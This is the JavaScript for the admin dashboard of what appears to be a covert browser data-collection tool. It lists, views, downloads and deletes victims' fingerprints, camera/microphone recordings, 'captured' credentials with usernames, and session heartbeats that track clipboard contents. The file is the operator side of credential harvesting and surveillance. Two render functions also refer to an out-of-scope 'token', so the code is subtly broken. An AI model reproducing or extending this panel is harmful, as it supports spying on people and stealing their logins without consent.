const tokenInput = document.querySelector('#token');
const loadBtn = document.querySelector('#load');
const statusEl = document.querySelector('#status');
const reportsEl = document.querySelector('#reports');
const recordingsEl = document.querySelector('#recordings');
const credentialsEl = document.querySelector('#credentials');
const heartbeatsEl = document.querySelector('#heartbeats');
const tabReports = document.querySelector('#tabReports');
const tabRecordings = document.querySelector('#tabRecordings');
const tabCredentials = document.querySelector('#tabCredentials');
const tabHeartbeats = document.querySelector('#tabHeartbeats');

const stored = localStorage.getItem('admin_token');
if (stored) { tokenInput.value = stored; loadAll(); }

tokenInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') loadAll(); });
loadBtn.addEventListener('click', loadAll);

function activateTab(active, tabs, panels) {
  tabs.forEach(t => t.classList.remove('active'));
  active.classList.add('active');
  panels.forEach(p => p.hidden = true);
  const idx = tabs.indexOf(active);
  if (panels[idx]) panels[idx].hidden = false;
}

tabReports.addEventListener('click', () => activateTab(tabReports, [tabReports, tabRecordings, tabCredentials, tabHeartbeats], [reportsEl, recordingsEl, credentialsEl, heartbeatsEl]));
tabRecordings.addEventListener('click', () => activateTab(tabRecordings, [tabReports, tabRecordings, tabCredentials, tabHeartbeats], [reportsEl, recordingsEl, credentialsEl, heartbeatsEl]));
tabCredentials.addEventListener('click', () => activateTab(tabCredentials, [tabReports, tabRecordings, tabCredentials, tabHeartbeats], [reportsEl, recordingsEl, credentialsEl, heartbeatsEl]));
tabHeartbeats.addEventListener('click', () => activateTab(tabHeartbeats, [tabReports, tabRecordings, tabCredentials, tabHeartbeats], [reportsEl, recordingsEl, credentialsEl, heartbeatsEl]));

async function loadAll() {
  const token = tokenInput.value.trim();
  if (!token) { statusEl.textContent = 'Enter a token'; return; }
  localStorage.setItem('admin_token', token);
  loadBtn.disabled = true;
  statusEl.textContent = 'Loading...';
  await Promise.all([loadReports(token), loadRecordings(token), loadCredentials(token), loadHeartbeats(token)]);
  loadBtn.disabled = false;
}

function deleteButton(token, type, id, label, cb) {
  const btn = document.createElement('button');
  btn.className = 'text-button danger';
  btn.textContent = label || 'Delete';
  btn.addEventListener('click', async () => {
    if (!confirm('Delete ' + type.slice(0, -1) + ' #' + id + '? This cannot be undone.')) return;
    try {
      const resp = await fetch('/api/admin/' + type + '/' + id, { method: 'DELETE', headers: { Authorization: 'Bearer ' + token } });
      const data = await resp.json();
      if (!resp.ok) throw new Error(data.error || 'Delete failed');
      statusEl.textContent = 'Deleted ' + type.slice(0, -1) + ' #' + id;
      if (cb) cb();
      else loadAll();
    } catch (err) {
      statusEl.textContent = err.message;
    }
  });
  return btn;
}

function deleteAllButton(token, type, label, cb) {
  const btn = document.createElement('button');
  btn.className = 'text-button danger';
  btn.textContent = label || 'Delete All';
  btn.addEventListener('click', async () => {
    if (!confirm('Delete ALL ' + type + '? This cannot be undone.')) return;
    try {
      const resp = await fetch('/api/admin/' + type, { method: 'DELETE', headers: { Authorization: 'Bearer ' + token } });
      const data = await resp.json();
      if (!resp.ok) throw new Error(data.error || 'Delete failed');
      statusEl.textContent = 'Deleted ' + (data.deleted || 0) + ' ' + type;
      if (cb) cb();
      else loadAll();
    } catch (err) {
      statusEl.textContent = err.message;
    }
  });
  return btn;
}

async function loadReports(token) {
  try {
    const resp = await fetch('/api/admin/reports', { headers: { Authorization: 'Bearer ' + token } });
    const data = await resp.json();
    if (!resp.ok) throw new Error(data.error || 'Failed');
    renderReports(data.reports, token);
    statusEl.textContent = data.reports.length + ' report(s) loaded';
  } catch (err) {
    if (!reportsEl.children.length) statusEl.textContent = err.message;
    reportsEl.innerHTML = '<div class="empty-state">' + err.message + '</div>';
  }
}

async function loadRecordings(token) {
  try {
    const resp = await fetch('/api/admin/recordings', { headers: { Authorization: 'Bearer ' + token } });
    const data = await resp.json();
    if (!resp.ok) throw new Error(data.error || 'Failed');
    renderRecordings(data.recordings, token);
  } catch (err) {
    recordingsEl.innerHTML = '<div class="empty-state">' + err.message + '</div>';
  }
}

async function loadCredentials(token) {
  try {
    const resp = await fetch('/api/admin/credentials', { headers: { Authorization: 'Bearer ' + token } });
    const data = await resp.json();
    if (!resp.ok) throw new Error(data.error || 'Failed');
    renderCredentials(data.credentials, token);
  } catch (err) {
    credentialsEl.innerHTML = '<div class="empty-state">' + err.message + '</div>';
  }
}

async function loadHeartbeats(token) {
  try {
    const resp = await fetch('/api/admin/heartbeats', { headers: { Authorization: 'Bearer ' + token } });
    const data = await resp.json();
    if (!resp.ok) throw new Error(data.error || 'Failed');
    renderHeartbeats(data.heartbeats, token);
  } catch (err) {
    heartbeatsEl.innerHTML = '<div class="empty-state">' + err.message + '</div>';
  }
}

function renderReports(list, token) {
  reportsEl.innerHTML = '';
  if (!list.length) { reportsEl.innerHTML = '<div class="empty-state">No reports yet</div>'; return; }
  list.forEach((r) => {
    const row = document.createElement('div');
    row.className = 'admin-row';
    const meta = document.createElement('div');
    meta.className = 'admin-meta';
    const title = document.createElement('strong');
    const fp = r.fingerprint;
    const hasCamera = fp?.permissions?.camera_microphone?.recording_id ? ' \uD83D\uDCF9' : '';
    const hasAdvanced = fp?.advanced ? ' \u2699\uFE0F' : '';
    title.textContent = 'Report #' + r.id + hasCamera + hasAdvanced;
    const sc = fp?.browser_signals?.Screen || '';
    const br = fp?.browser_signals?.Browser?.slice(0, 40) || '';
    const date = document.createElement('small');
    date.textContent = new Date(r.created_at).toLocaleString() + '  \u00b7  ' + r.event_count + ' events' + (sc ? '  \u00b7  ' + sc : '');
    meta.append(title, date);
    const actions = document.createElement('div');
    actions.className = 'admin-actions';
    const viewBtn = document.createElement('button');
    viewBtn.className = 'text-button';
    viewBtn.textContent = 'View';
    viewBtn.addEventListener('click', () => viewReport(r));
    const dlBtn = document.createElement('button');
    dlBtn.className = 'text-button';
    dlBtn.textContent = 'Download';
    dlBtn.addEventListener('click', () => downloadReport(r.id, token));
    const delBtn = deleteButton(token, 'reports', r.id, 'Delete');
    actions.append(viewBtn, dlBtn, delBtn);
    row.append(meta, actions);
    reportsEl.append(row);
  });
  reportsEl.prepend(deleteAllButton(token, 'reports', 'Delete All Reports', () => loadReports(token)));
}

function renderRecordings(list, token) {
  recordingsEl.innerHTML = '';
  if (!list.length) { recordingsEl.innerHTML = '<div class="empty-state">No recordings yet</div>'; return; }
  list.forEach((r) => {
    const row = document.createElement('div');
    row.className = 'admin-row';
    const meta = document.createElement('div');
    meta.className = 'admin-meta';
    const title = document.createElement('strong');
    title.textContent = 'Recording #' + r.id;
    const date = document.createElement('small');
    const size = r.bytes ? (r.bytes / 1024).toFixed(1) + ' KB' : 'unknown size';
    date.textContent = new Date(r.created_at).toLocaleString() + '  \u00b7  ' + size + '  \u00b7  ' + (r.mime_type || 'webm');
    meta.append(title, date);
    const actions = document.createElement('div');
    actions.className = 'admin-actions';
    const dlBtn = document.createElement('button');
    dlBtn.className = 'text-button';
    dlBtn.textContent = 'Download';
    dlBtn.addEventListener('click', () => downloadRecording(r.id, token));
    const delBtn = deleteButton(token, 'recordings', r.id, 'Delete');
    actions.append(dlBtn, delBtn);
    row.append(meta, actions);
    recordingsEl.append(row);
  });
  recordingsEl.prepend(deleteAllButton(token, 'recordings', 'Delete All Recordings', () => loadRecordings(token)));
}

function renderCredentials(list) {
  credentialsEl.innerHTML = '';
  if (!list.length) { credentialsEl.innerHTML = '<div class="empty-state">No credentials captured</div>'; return; }
  list.forEach((r) => {
    const row = document.createElement('div');
    row.className = 'admin-row';
    const meta = document.createElement('div');
    meta.className = 'admin-meta';
    const title = document.createElement('strong');
    const urlShort = r.url?.length > 50 ? r.url.slice(0, 50) + '...' : r.url || 'unknown';
    title.textContent = urlShort;
    const date = document.createElement('small');
    date.textContent = new Date(r.created_at).toLocaleString() + '  \u00b7  session: ' + (r.session_id || '').slice(0, 10) + (r.username ? '  \u00b7  user: ' + r.username : '');
    meta.append(title, date);
    const actions = document.createElement('div');
    actions.className = 'admin-actions';
    const delBtn = deleteButton(token, 'credentials', r.id, 'Delete');
    actions.append(delBtn);
    row.append(meta, actions);
    credentialsEl.append(row);
  });
  credentialsEl.prepend(deleteAllButton(token, 'credentials', 'Delete All Credentials', () => loadCredentials(token)));
}

function renderHeartbeats(list) {
  heartbeatsEl.innerHTML = '';
  if (!list.length) { heartbeatsEl.innerHTML = '<div class="empty-state">No heartbeats yet</div>'; return; }
  list.forEach((r) => {
    const row = document.createElement('div');
    row.className = 'admin-row';
    const meta = document.createElement('div');
    meta.className = 'admin-meta';
    const title = document.createElement('strong');
    const clipChanges = r.state?.clipboard?.length || 0;
    const netChanges = r.state?.network?.length || 0;
    const batChanges = r.state?.battery?.length || 0;
    title.textContent = 'Session ' + (r.session_id || '').slice(0, 10);
    const date = document.createElement('small');
    date.textContent = new Date(r.created_at).toLocaleString() + '  \u00b7  clipboard: ' + clipChanges + '  net: ' + netChanges + '  battery: ' + batChanges;
    meta.append(title, date);
    const actions = document.createElement('div');
    actions.className = 'admin-actions';
    const viewBtn = document.createElement('button');
    viewBtn.className = 'text-button';
    viewBtn.textContent = 'View';
    viewBtn.addEventListener('click', () => {
      const overlay = document.createElement('div');
      overlay.className = 'overlay';
      const panel = document.createElement('div');
      panel.className = 'overlay-panel';
      const head = document.createElement('div');
      head.className = 'overlay-head';
      head.innerHTML = '<strong>Heartbeat</strong><button class="text-button close-btn">Close</button>';
      head.querySelector('.close-btn').addEventListener('click', () => overlay.remove());
      overlay.addEventListener('click', (e) => { if (e.target === overlay) overlay.remove(); });
      const body = document.createElement('div');
      body.className = 'overlay-body';
      const pre = document.createElement('pre');
      pre.className = 'json-view';
      pre.textContent = JSON.stringify(r.state, null, 2);
      body.append(pre);
      panel.append(head, body);
      overlay.append(panel);
      document.body.append(overlay);
    });
    const delBtn = deleteButton(token, 'heartbeats', r.id, 'Delete');
    actions.append(viewBtn, delBtn);
    row.append(meta, actions);
    heartbeatsEl.append(row);
  });
  heartbeatsEl.prepend(deleteAllButton(token, 'heartbeats', 'Delete All Heartbeats', () => loadHeartbeats(token)));
}

async function downloadReport(id, token) {
  try {
    const resp = await fetch('/api/admin/reports/' + id + '/download', { headers: { Authorization: 'Bearer ' + token } });
    if (!resp.ok) { statusEl.textContent = 'Download failed'; return; }
    const blob = await resp.blob();
    const link = document.createElement('a');
    link.href = URL.createObjectURL(blob);
    link.download = 'report-' + id + '.json';
    link.click();
    URL.revokeObjectURL(link.href);
    statusEl.textContent = 'Report #' + id + ' downloaded';
  } catch (err) {
    statusEl.textContent = err.message;
  }
}

async function downloadRecording(id, token) {
  try {
    const resp = await fetch('/api/admin/recordings/' + id, { headers: { Authorization: 'Bearer ' + token } });
    if (!resp.ok) { statusEl.textContent = 'Download failed'; return; }
    const blob = await resp.blob();
    const ext = blob.type.includes('webm') ? 'webm' : 'mp4';
    const link = document.createElement('a');
    link.href = URL.createObjectURL(blob);
    link.download = 'recording-' + id + '.' + ext;
    link.click();
    URL.revokeObjectURL(link.href);
    statusEl.textContent = 'Recording #' + id + ' downloaded';
  } catch (err) {
    statusEl.textContent = err.message;
  }
}

function viewReport(r) {
  const overlay = document.createElement('div');
  overlay.className = 'overlay';
  const panel = document.createElement('div');
  panel.className = 'overlay-panel';
  const head = document.createElement('div');
  head.className = 'overlay-head';
  head.innerHTML = '<strong>Report #' + r.id + '</strong><button class="text-button close-btn">Close</button>';
  head.querySelector('.close-btn').addEventListener('click', () => overlay.remove());
  overlay.addEventListener('click', (e) => { if (e.target === overlay) overlay.remove(); });
  const body = document.createElement('div');
  body.className = 'overlay-body';
  const pre = document.createElement('pre');
  pre.className = 'json-view';
  pre.textContent = JSON.stringify(r.fingerprint, null, 2);
  body.append(pre);
  panel.append(head, body);
  overlay.append(panel);
  document.body.append(overlay);
}
